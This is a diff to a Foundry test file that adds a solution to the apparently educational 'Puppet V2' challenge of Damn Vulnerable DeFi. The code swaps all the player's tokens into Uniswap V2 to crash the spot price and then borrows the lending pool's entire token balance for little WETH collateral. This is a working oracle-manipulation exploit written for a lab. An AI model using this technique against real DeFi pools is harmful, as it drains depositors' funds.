@@ -10,6 +10,7 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
 
+
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -97,7 +98,31 @@ contract PuppetV2Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV2() public checkSolvedByPlayer {}
+    function test_puppetV2() public checkSolvedByPlayer {
+
+        token.approve(address(uniswapV2Router),type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForETH({
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMin: 0,
+            path: path,
+            to: player,
+            deadline: block.timestamp * 2
+        });
+
+        // since we have deposited  10_000e18 token , we will get 10_000 * 10/100 = 1000e18 ETH
+
+        // now we will convert ETH to WETH
+        weth.deposit{value: player.balance}();
+
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(poolBalance);
+        weth.approve(address(lendingPool),wethRequired);
+        lendingPool.borrow(poolBalance); 
+        token.transfer(recovery,poolBalance);     
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
